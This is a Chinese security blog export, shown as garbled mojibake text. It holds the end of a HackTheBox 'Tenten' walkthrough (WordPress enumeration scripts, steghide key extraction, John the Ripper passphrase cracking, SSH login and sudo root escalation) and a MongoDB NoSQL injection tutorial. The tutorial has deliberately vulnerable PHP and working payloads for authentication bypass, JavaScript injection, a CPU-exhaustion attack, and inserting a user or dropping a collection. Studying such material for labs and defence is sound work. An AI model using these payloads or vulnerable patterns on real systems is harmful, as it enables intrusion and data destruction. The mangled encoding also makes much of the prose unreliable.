wpscanä½¿ç”¨æ•™ç¨‹ï¼šhttps://www.cnblogs.com/Xy--1/p/12236684.html çœ‹åˆ°è¿™ä¸ªç‰ˆæœ¬æœ‰å¾ˆå¤šXSSæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯æ‰“è¿™ä¸ªé¶æœºXSSæ¼æ´ä¸€èˆ¬éƒ½æ˜¯æ²¡ä»€ä¹ˆä½œç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹ï¼Œå‘ç°ç«™ç‚¹å®‰è£…äº†ä¸€ä¸ªjob-managerçš„æ’ä»¶ã€‚ ç‚¹å‡»è¿›å…¥ç”³è¯·èŒä½çš„é¡µé¢ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼Œå†åˆ°http://10.10.10.10/wp-content/%year%/%month%/%filename%æŸ¥çœ‹å‘ç°å¯ä»¥æ­£å¸¸æ˜¾ç¤ºã€‚å†å°è¯•ç”¨BurpSuiteæ”¹ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š æœåŠ¡ç«¯æ£€æµ‹äº†åç¼€åï¼Œç›®å‰å·²çŸ¥åªèƒ½ä¸Šä¼ jpgï¼Œpngç­‰å›¾ç‰‡ç±»å‹ã€‚ https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/ è¿™ç¯‡æ–‡ç« æåˆ°äº†ä¸€ç§ç±»ä¼¼å¹³è¡Œè¶Šæƒçš„æ‰‹æ³•ï¼šhttp://10.10.10.10/index.php/jobs/apply/8/ï¼Œè¿™é‡Œ8ç±»ä¼¼æ‹›è˜æ–‡ç« çš„idï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨BurpSuiteéå†å®ƒï¼š å¦å¤–ï¼Œè¿™é‡Œæ‰©å±•ä¸€ç§æ€è·¯ï¼Œå¯ä»¥ç›´æ¥å†™bashè„šæœ¬è·‘å‡ºæ¥ï¼Œè¿™ç§ç»“æœæ›´ä¸ºç›´è§‚ï¼š 1for i in $(seq 1 20); do echo -n &quot;$i: &quot;; curl -s http://10.10.10.10/index.php/jobs/apply/$i | grep &#x27;&lt;title&gt;&#x27;; done id=13çš„è¿™ç¯‡æ–‡ç« æ ‡é¢˜æ˜¯HackerAccessGrantedï¼Œæ¯”è¾ƒå¯ç–‘ï¼Œå¦å¤–id=17çš„æ–‡ç« æ ‡é¢˜æ˜¯æˆ‘åˆšåˆšä¸Šä¼ çš„å›¾ç‰‡çš„æ–‡ä»¶åã€‚è¿™ä¸¤ç‚¹ç»“åˆèµ·æ¥ï¼Œæˆ‘ä»¬æ€€ç–‘HackerAccessGrantedæ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ç”¨æˆ·ä¸Šä¼ çš„ä¸€å¼ å›¾ç‰‡çš„æ–‡ä»¶åã€‚ä½†æ˜¯è¦è®¿é—®åˆ°è¿™å¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“ä¸Šä¼ çš„å¹´ä»½å’Œæœˆä»½ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œé‚£å°±å†™ä¸€ä¸ªPythonè„šæœ¬è·‘ä¸€ä¸‹ï¼š 123456789101112131415import requestswebsite = &#x27;http://10.10.10.10/wp-content/uploads/&#x27;filename = &#x27;HackerAccessGranted&#x27;exts = [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;]for year in range(2016, 2018): for month in range(1, 13): for ext in exts: url = website + str(year) + &#x27;/&#x27; + &quot;&#123;:02&#125;&quot;.format(month) + &#x27;/&#x27; + filename + &#x27;.&#x27; + ext req = requests.get(url) if req.status_code == 404: url = website else: print(&#x27;[+] URL Found: &#x27; + url) å¾—åˆ°ç»“æœhttp://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg æŠŠå›¾ç‰‡ç”¨binwalkæ£€æŸ¥ä¸€ä¸‹ï¼š 12345$ binwalk HackerAccessGranted.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.01 å†ç”¨éšå†™å·¥å…·steghideæå–ä¸€ä¸‹ï¼š 123$ steghide extract -sf HackerAccessGranted.jpg Enter passphrase: wrote extracted data to &quot;id_rsa&quot;. OKï¼Œæå–å‡ºäº†id_rsaæ–‡ä»¶ï¼Œå†ç”¨Johnä¸€æŠŠæ¢­ 1234567891011121314$ python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash $ &#x2F;sbin&#x2F;john id_rsa.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) 32&#x2F;64])Cost 1 (KDF&#x2F;cipher [0&#x3D;MD5&#x2F;AES 1&#x3D;MD5&#x2F;3DES 2&#x3D;Bcrypt&#x2F;AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#39;q&#39; or Ctrl-C to abort, almost any other key for statussuperpassword (id_rsa)Warning: Only 2 candidates left, minimum 4 needed for performance.1g 0:00:00:08 DONE (2020-03-18 10:52) 0.1173g&#x2F;s 1683Kp&#x2F;s 1683Kc&#x2F;s 1683KC&#x2F;sa6_123..*7Â¡Vamos!Session completed å¥½äº†ï¼Œå¾—åˆ°äº†å¯†ç ï¼Œä½†æ˜¯ç°åœ¨å¥½åƒè¿˜æ²¡æœ‰ç”¨æˆ·åorzâ€¦ï¼Œå†ç”¨wpscanæšä¸¾ç«™ç‚¹çš„ç”¨æˆ·å 12345678910[i] User(s) Identified:[+] takis | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;10.10.10.10&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) å†ç”¨sshç™»å½•é¶æœºï¼Œè·å–user.txt 123456789101112131415161718192021222324252627282930$ ssh -i id_rsa takis@10.10.10.10Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage65 packages can be updated.39 updates are security updates.Last login: Fri May 5 23:05:36 2017takis@tenten:~$ whoamitakistakis@tenten:~$ ls -la &#x2F;home&#x2F;takistotal 48drwx------ 5 takis takis 4096 Apr 12 2017 .drwxr-xr-x 5 root root 4096 Apr 12 2017 ..-rw------- 1 root root 1 Dec 24 2017 .bash_history-rw-r--r-- 1 takis takis 220 Apr 12 2017 .bash_logout-rw-r--r-- 1 takis takis 3771 Apr 12 2017 .bashrcdrwx------ 2 takis takis 4096 Apr 12 2017 .cache-rw------- 1 root root 162 Apr 12 2017 .mysql_historydrwxrwxr-x 2 takis takis 4096 Apr 12 2017 .nano-rw-r--r-- 1 takis takis 655 Apr 12 2017 .profiledrwx------ 2 takis takis 4096 Apr 12 2017 .ssh-rw-r--r-- 1 takis takis 0 Apr 12 2017 .sudo_as_admin_successful-r--r--r-- 1 takis takis 33 Apr 12 2017 user.txt-rw-r--r-- 1 root root 217 Apr 12 2017 .wget-hsts ææƒå°±å¾ˆç®€å•äº† 1234567891011121314takis@tenten:~$ sudo -lMatching Defaults entries for takis on tenten: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser takis may run the following commands on tenten: (ALL : ALL) ALL (ALL) NOPASSWD: &#x2F;bin&#x2F;fuckintakis@tenten:~$ ls -la &#x2F;bin&#x2F;fuckin-rwxr-xr-x 1 root root 24 Apr 12 2017 &#x2F;bin&#x2F;fuckintakis@tenten:~$ cat &#x2F;bin&#x2F;fuckin#!&#x2F;bin&#x2F;bash$1 $2 $3 $4takis@tenten:~$ sudo &#x2F;bin&#x2F;fuckin cat &#x2F;root&#x2F;root.txtf9f7[------------------]f603 0x04 Summary Tentenç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤è€çš„Linuxé¶æœºäº†ï¼Œå°±æƒå½“å¼€é˜”çŸ¥è¯†é¢ï¼Œè¿™ä¸ªé¶æœºçš„é£æ ¼å’ŒCTFçš„æ¯”èµ›é¢˜å¾ˆåƒï¼Œé€šè¿‡æ‰¾wordpressç«™ç‚¹çš„æ’ä»¶æ¼æ´ï¼Œä»¥åŠå¸¸è§çš„wordpressä¸Šä¼ è·¯å¾„æ¥æ‰¾åˆ°éšå†™id_rsaæ–‡ä»¶çš„å›¾ç‰‡ã€‚ä¹‹åçš„è¿‡ç¨‹å°±æ˜¯æ¯”è¾ƒç®€å•çš„ææƒæ“ä½œäº†ï¼Œæ–¹æ³•æœ‰å¾ˆå¤šã€‚è¿™ä¸ªé¶æœºç®—æ˜¯æ¯”è¾ƒç®€å•çš„å§ï¼Œå†™äº†ä¸€ä¸ªå°è„šæœ¬æ¥çˆ†ç ´ç›®å½•ï¼Œä¸€å¤©æå®šï¼Œæ˜å¤©ç»§ç»­ã€‚","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"NoSQLæ³¨å…¥ä¹‹MongoDB","date":"2020-03-17T15:54:20.000Z","path":"Web_security/basic_learning/21.NoSQLæ³¨å…¥ä¹‹MongoDB/","text":"æ–‡ç« é¦–å‘äº ä¿¡å®‰ä¹‹è·¯ å…¬ä¼—å· NoSQLæ³¨å…¥ä¹‹MongoDB 0x01 NoSQLå’ŒMongoDB NoSQL NoSQLçš„æ¦‚å¿µå°±ä¸èµ˜è¿°äº†ï¼Œä»¥ä¸‹æ‘˜è‡ªèœé¸Ÿæ•™ç¨‹ã€‚ NoSQLï¼ŒæŒ‡çš„æ˜¯éå…³ç³»å‹çš„æ•°æ®åº“ã€‚NoSQLæœ‰æ—¶ä¹Ÿç§°ä½œNot Only SQLçš„ç¼©å†™ï¼Œæ˜¯å¯¹ä¸åŒäºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ç»Ÿç§°ã€‚NoSQLç”¨äºè¶…å¤§è§„æ¨¡æ•°æ®çš„å­˜å‚¨ã€‚ï¼ˆä¾‹å¦‚è°·æ­Œæˆ–Facebookæ¯å¤©ä¸ºä»–ä»¬çš„ç”¨æˆ·æ”¶é›†ä¸‡äº¿æ¯”ç‰¹çš„æ•°æ®ï¼‰ã€‚è¿™äº›ç±»å‹çš„æ•°æ®å­˜å‚¨ä¸éœ€è¦å›ºå®šçš„æ¨¡å¼ï¼Œæ— éœ€å¤šä½™æ“ä½œå°±å¯ä»¥æ¨ªå‘æ‰©å±•ã€‚ MongoDB è¯¦ç»†æ¦‚å¿µå»ºè®®ç›´æ¥çœ‹æ•™ç¨‹ ä¼ é€é—¨ğŸšªï¼Œè¿™é‡Œå°±ç®€å•çš„æ€»ç»“å‡ å¥ã€‚ åœ¨MySQLä¸­ï¼Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„å‡ ä¸ªæœ€å¸¸è§çš„æ¦‚å¿µæ˜¯æ•°æ®åº“(Database)ã€è¡¨(Table)ã€å­—æ®µ(Column)ã€è®°å½•(Record)ã€ç´¢å¼•(Index)ï¼Œè¿™äº›æœ¯è¯­æ˜ å°„åˆ°MongoDBä¸­å¤§æ¦‚ç­‰ä»·äºæ•°æ®åº“(Database)ã€é›†åˆ(Collection)ã€åŸŸ(Field)ã€æ–‡æ¡£(Document)ã€ç´¢å¼•(Index)ã€‚ä¸‹é¢å°±é€šè¿‡å®˜ç½‘æ–‡æ¡£çš„å‡ å¼ å›¾ç•¥ä½œè§£é‡Šã€‚ æ–‡æ¡£æ˜¯ç”±ä¸€ç»„é”®å€¼(key-value)å¯¹(å³ BSONï¼ŒBinary JSON)ç»„æˆã€‚MongoDB çš„æ–‡æ¡£ä¸éœ€è¦è®¾ç½®ç›¸åŒçš„å­—æ®µï¼Œå¹¶ä¸”ç›¸åŒçš„å­—æ®µä¸éœ€è¦ç›¸åŒçš„æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ï¼š é›†åˆå°±æ˜¯ MongoDB æ–‡æ¡£ç»„ï¼Œé›†åˆå­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œé›†åˆæ²¡æœ‰å›ºå®šçš„ç»“æ„ï¼Œè¿™æ„å‘³ç€ä½ å¯¹é›†åˆå¯ä»¥æ’å…¥ä¸åŒæ ¼å¼å’Œç±»å‹çš„æ•°æ®ï¼Œä½†é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ’å…¥é›†åˆçš„æ•°æ®éƒ½ä¼šæœ‰ä¸€å®šçš„å…³è”æ€§ã€‚ä¸‹é¢è¿™å¼ å›¾å±•ç¤ºäº†è¿™ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼š å¥½äº†ï¼Œå‰ç½®çŸ¥è¯†éƒ¨åˆ†ä»‹ç»åˆ°è¿™é‡Œï¼Œä¸‹é¢å¼€å§‹ä»Šå¤©çš„æ­£æ–‡éƒ¨åˆ†ï¼šMongoDBæ³¨å…¥ 0x02 NoSQLæ³¨å…¥ è®²MangoDBæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¤§è‡´äº†è§£ä¸€ä¸‹æ•´ä¸ªNoSQLæ³¨å…¥çš„æµç¨‹ï¼Œä¸‹é¢è¿™å¼ å›¾æ¥è‡ªOWASPï¼š NoSQLæä¾›äº†æ–°çš„æ•°æ®æ¨¡å‹å’ŒæŸ¥è¯¢æ ¼å¼ï¼Œä»è€Œå¯ä»¥è§„é¿å¸¸è§„çš„SQLæ³¨å…¥æ”»ã€‚ä½†æ˜¯ï¼Œå®ƒä»¬ä¹Ÿä¸ºæ”»å‡»è€…æä¾›äº†æ’å…¥æ¶æ„ä»£ç çš„æ–°æ–¹æ³•ã€‚æ€»çš„æ¥è®²æœ‰å››ç§æ³¨å…¥æ‰‹æ³•ï¼š é‡è¨€å¼ åˆç§°ä¸ºæ°¸çœŸå¼ï¼ˆè¿™ä¸ªå¥½åƒæ˜¯æ•°ç†é€»è¾‘é‡Œé¢çš„æœ¯è¯­ï¼‰ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚ è”åˆæŸ¥è¯¢ è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„SQLæ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚ JavaScriptæ³¨å…¥ MongoDB Serveræ”¯æŒJavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚ ç›²æ³¨ å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡$regexæ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’ŒSQLæ³¨å…¥ä¸­substr()å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸”NoSQLç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚ 0x03 PHP MongoDBæ³¨å…¥ åœ¨PHPä¸­ä½¿ç”¨MongoDBä½ å¿…é¡»ä½¿ç”¨ MongoDB çš„ PHPé©±åŠ¨ï¼Œå®˜ç½‘ä¸Šå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œå…¶ä¸­1.0.0ç‰ˆæœ¬ä¹‹åï¼Œphp_mongodb.dllå°†ä¸å†æ”¯æŒMongoClientç±»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ$m = new MongoClient(&quot;mongodb://localhost:27017&quot;);è¿™ç§è°ƒç”¨æ–¹å¼å·²ç»è¢«æ·˜æ±°ï¼Œè€Œæ˜¯ç”¨å‘½åç©ºé—´çš„æ–¹å¼ï¼Œä½†æ˜¯æ³¨å…¥çš„æ‰‹æ³•å’ŒåŸç†æ˜¯å·®ä¸å¤šçš„ï¼Œè¿™é‡Œå°±ä¸»è¦ä»‹ç»ä¸€ä¸‹æ–°ç‰ˆPHPé©±åŠ¨è¿›è¡ŒæŸ¥è¯¢æ“ä½œMongoDBçš„ä¸‰ç§æ–¹æ³•ï¼ˆä¸€èˆ¬æ³¨å…¥ä¹Ÿæ˜¯å‘ç”Ÿåœ¨æŸ¥è¯¢è¯­å¥ä¸­ï¼‰ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå‡ä»¥GETè¯·æ±‚æ–¹å¼ä¸ºä¾‹ã€‚ æµ‹è¯•ç¯å¢ƒ win10 PHP 7.3.4 MongoDB Server 4.2 php_mongodb.dll 1.7.4 é‡è¨€å¼æ³¨å…¥ åˆ©ç”¨executeQueryç›´æ¥æŸ¥è¯¢ï¼š 123456789101112131415161718192021222324252627&lt;?php# è¿æ¥æ•°æ®åº“$manager = new MongoDB\\Driver\\Manager(&quot;mongodb://localhost:27017&quot;);$uname = $_GET[&#x27;username&#x27;];$pwd = $_GET[&#x27;password&#x27;];# æŸ¥è¯¢è¯­å¥$query = new MongoDB\\Driver\\Query(array( &#x27;uname&#x27; =&gt; $uname, &#x27;pwd&#x27; =&gt; $pwd));# æ‰§è¡Œè¯­å¥$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();$count = count($result);if ($count &gt; 0) &#123; foreach ($result as $user) &#123; $user = ((array)$user); echo &#x27;username:&#x27; . $user[&#x27;uname&#x27;] . &#x27;&lt;br&gt;&#x27;; echo &#x27;password:&#x27; . $user[&#x27;pwd&#x27;] . &#x27;&lt;br&gt;&#x27;; &#125;&#125;else&#123; echo &#x27;Not Found&#x27;;&#125; ä¼ é€’çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯”è¾ƒå®‰å…¨ã€‚è¿™ç§å½¢å¼å« ODMï¼Œå®ƒä¼šå¸®ä½ è¿‡æ»¤æ•°æ®ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ç”¨æ‹…å¿ƒåŸè¯­å¥è¢«ç ´åã€‚ ORM å¯¹åº”å…³ç³»å‹æ•°æ®åº“ï¼Œå¦‚ MySQLï¼›ODM å¯¹åº”æ–‡æ¡£å‹æ•°æ®åº“ï¼Œå¦‚ MongoDBã€‚ å½“æˆ‘ä»¬ç”¨å…¬å…±ç”¨æˆ·ca01hè¾“å…¥æ—¶ï¼Œæ˜¾ç¤ºå‡ºusernameå’Œpasswordï¼š è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¾“å…¥ï¼Œæ•°æ®å¤„ç†è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š PHPå…è®¸æœ€ç»ˆç”¨æˆ·é€šè¿‡å°†URLå‚æ•°æ›´æ”¹ä¸ºå¸¦æœ‰æ–¹æ‹¬å·çš„å‚æ•°æ¥å°†GETæŸ¥è¯¢å­—ç¬¦ä¸²è¾“å…¥æ›´æ”¹ä¸ºæ•°ç»„ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹è¿™ç§è¾“å…¥ï¼š $neå³not equalä¸ç­‰äº amazing~æ‰€æœ‰ç”¨æˆ·éƒ½æŸ¥å‡ºæ¥äº†ï¼Œå†çœ‹ä¸€ä¸‹æ•°æ®å¤„ç†è¿‡ç¨‹ï¼š å¯¹äºPHPæœ¬èº«çš„ç‰¹æ€§è€Œè¨€ï¼Œç”±äºå…¶æ¾æ•£çš„æ•°ç»„ç‰¹æ€§ï¼Œå¯¼è‡´å¦‚æœæˆ‘ä»¬è¾“å…¥value=1é‚£ä¹ˆï¼Œä¹Ÿå°±æ˜¯è¾“å…¥äº†ä¸€ä¸ªvalueçš„å€¼ä¸º1çš„æ•°æ®ã€‚å¦‚æœè¾“å…¥value[$ne]=1ä¹Ÿå°±æ„å‘³ç€value=array($ne=&gt;1),åœ¨MongoDBä¸­ï¼ŒåŸæ¥çš„ä¸€ä¸ªå•ä¸ªç›®æ ‡çš„æŸ¥è¯¢å˜æˆäº†æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨username[$gt]=&amp;password[$gt]=ä½œä¸ºpayloadè¿›è¡Œæ”»å‡»ã€‚ è¿™ç§æ–¹å¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šå¸¸ç”¨æ¥éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨NoSQLæ³¨å…¥çš„ç¬¬ä¸€æ­¥ã€‚ è”åˆæŸ¥è¯¢æ³¨å…¥ æˆ‘ä»¬éƒ½çŸ¥é“åœ¨SQLæ—¶ä»£æ‹¼æ¥å­—ç¬¦ä¸²å®¹æ˜“é€ æˆSQLæ³¨å…¥ï¼ŒNoSQLä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ï¼Œä½†æ˜¯ç°åœ¨æ— è®ºæ˜¯PHPçš„MongoDB driverè¿˜æ˜¯node.jsçš„mongooseéƒ½å¿…é¡»è¦æ±‚æŸ¥è¯¢æ¡ä»¶å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…queryå¯¹è±¡äº†ï¼Œå› æ­¤ç®€å•çœ‹ä¸€ä¸‹å°±å¥½ã€‚ ç¤ºä¾‹ä»£ç ï¼š 1string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot; Payloadï¼š 1username&#x3D;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password&#x3D;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39; ç›¸å½“äºæ‰§è¡Œäº†ï¼š 1&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39; è¿™ç§æ‰‹æ³•å’ŒSQLæ³¨å…¥æ¯”è¾ƒç›¸ä¼¼ï¼š 1select * from logins where username &#x3D; &#39;admin&#39; and (password true&lt;&gt; or (&#39;a&#39;&#x3D;&#39;a&#39; and password &#x3D; &#39;&#39;)) JavaScriptæ³¨å…¥ $whereæ“ä½œç¬¦ åœ¨MongoDBä¸­ $whereæ“ä½œç¬¦æ˜¯å¯ä»¥æ‰§è¡ŒJavaScriptè¯­å¥çš„ï¼Œåœ¨MongoDB 2.4ä¹‹å‰ï¼Œé€šè¿‡$whereæ“ä½œç¬¦ä½¿ç”¨map-reduceã€groupå‘½ä»¤å¯ä»¥è®¿é—®åˆ°mongo shellä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ã€‚ 123456789101112131415161718192021222324&lt;?php$manager = new MongoDB\\Driver\\Manager();$uname = $_GET[&#x27;username&#x27;];$pwd = $_GET[&#x27;password&#x27;];$function = &quot;function() &#123;if(this.uname == &#x27;$uname&#x27; &amp;&amp; this.pwd == &#x27;$pwd&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;;$query = new MongoDB\\Driver\\Query(array( &#x27;$where&#x27; =&gt; $function));$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();$count = count($result);if ($count&gt;0) &#123; foreach ($result as $user) &#123; $user=(array)$user; echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;&lt;br&gt;&quot;; echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;&lt;br&gt;&quot;; &#125;&#125;else&#123; echo &#x27;Not Found&#x27;;&#125; MongoDB 2.4ç‰ˆæœ¬ä¹‹å‰ï¼Œå¯ä»¥è®¿é—®åˆ°dbå±æ€§ï¼š 1?username&#x3D;&#39;||1) return &#123;&#39;username&#39;: tojson(db.getCollectionNames()), &#39;password&#39;: &#39;hacked&#39;&#125;&#125;&#x2F;&#x2F;&amp;password&#x3D;1 ç”±æ­¤å¯ä»¥æ‰©å±•å‡ºå…¶ä»–çš„å¾ˆå¤šç±»ä¼¼çš„payloadã€‚ MongoDB 2.4ç‰ˆæœ¬ä¹‹åï¼Œæ— æ³•è®¿é—®å…¨å±€å±æ€§ï¼ŒNoSQLä¸­çš„ä¸‡èƒ½å¯†ç payload(å•å¼•å·é—­åˆ)ï¼š 1?username&#x3D;1&amp;password&#x3D;admin&#39; || &#39;&#39; &#x3D; &#39; ç›¸å½“äºæ‰§è¡Œï¼š 1$function &#x3D; &quot;function() &#123;if(this.uname &#x3D;&#x3D; &#39;anything&#39; &amp;&amp; this.pwd &#x3D;&#x3D; &#39;admin&#39; || &#39;&#39; &#x3D;&#x3D; &#39;&#39;) return &#123;&#39;username&#39;: this.uname, &#39;password&#39;: this.pwd&#125;&#125;&quot;; æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼äºDOSæ”»å‡»çš„payloadï¼Œå¯ä»¥è®©æœåŠ¡å™¨CPUé£™å‡åˆ°100%æŒç»­5ç§’ï¼š 1?username&#x3D;1&amp;password&#x3D;1;(function()&#123;var date &#x3D; new Date(); do&#123;curDate &#x3D; new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)(); eval æ³¨æ„ï¼Œevalä½¿ç”¨æ–¹å¼åœ¨Mongo3.0ä¹‹åå·²ç»è¢«åºŸå¼ƒäº†ï¼Œè€Œä¸”åœ¨å®˜æ–¹é¡µé¢ä¸­ä¹Ÿæ²¡æœ‰Mongo3.0ç‰ˆæœ¬ä¹‹å‰çš„ä¸‹è½½é“¾æ¥äº†ï¼Œä»¥ä¸‹çš„å®ä¾‹ä»£ç æœªç»æµ‹è¯•ï¼Œä»…æä¾›ç»™å¤§å®¶ä¸€ä¸ªæ€è·¯ï¼Œä»¥ä¸‹ä»£ç å¼•ç”¨è‡ªhttps://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html 123456789101112131415161718192021222324&lt;?php$manager = new MongoDB\\Driver\\Manager();$uname = $_GET[&#x27;username&#x27;];$pwd = $_GET[&#x27;password&#x27;];$cmd = new MongoDB\\Driver\\Command([&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname&#x27;&#125;)&quot;]);echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname&#x27;&#125;)&quot;;$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();$result =((array)$result[0])[&#x27;retval&#x27;];$count = count($result);if ($count&gt;0) &#123; foreach ($result as $user) &#123; $user=(array)$user; echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\\n&quot;; echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\\n&quot;; &#125;&#125;else&#123; echo &#x27;Not Found&#x27;;&#125;?&gt; å¾€usersé›†åˆæ’å…¥æ”»å‡»è€…ç”¨æˆ·ï¼š 1?username&#x3D;1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2 åˆ æ‰usersé›†åˆï¼š 1?username&#x3D;1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2 mapReduce 